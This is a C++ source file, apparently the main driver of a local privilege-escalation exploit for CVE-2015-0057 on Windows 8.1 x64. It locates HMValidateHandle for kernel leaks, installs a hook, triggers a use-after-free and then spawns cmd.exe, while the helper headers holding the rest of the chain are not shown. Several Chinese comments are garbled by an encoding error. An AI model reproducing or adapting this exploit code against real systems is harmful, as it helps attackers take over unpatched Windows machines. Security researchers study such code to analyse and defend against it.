/**********************************************
* cve-2015-0057:
*	By wjllz 
*   1214wjllz@gmail.com
*	www.redog.me
* windows 8.1 x64
* 虚拟机 内存: 8G   
***********************************************/
#include <Windows.h>
#include <iostream>
#include "uaf.h"
#include "kernelLeaks.h"	
#include "spray.h"

static
VOID xxCreateCmdLineProcess(VOID)
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn)
	{
		std::cout << "PLEASE CMD" << std::endl;
	}
	else
	{
		__debugbreak();
		std::cout << "CMD???" << std::endl;
	}
}
int main()
{
	// �ں�й¶Ԥ�� �������Դ���

	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		printf("Failed to locate HmValidateHandle, exiting\n");
		return 1;
	}

	// ����©��
	// ���ù��Ӻ���


	std::cout << "[+] trigger" << std::endl;
	// ����Hook �����ı�־λ
	std::cout << "[+] set hooked func" << std::endl;
	// ��ȥhook�������û���� hook֮�����ں�������û���ܹ���� �߼��ֲ�̫��...
	setHookedFunction();
	// �����߳�ѽ
	triggerVul();
	// ����
	//__debugbreak();

	xxCreateCmdLineProcess();
	Sleep(5000);
	std::cout << "-------------------" << std::endl;
	getchar();
	getchar();
	getchar();
	return 0;
}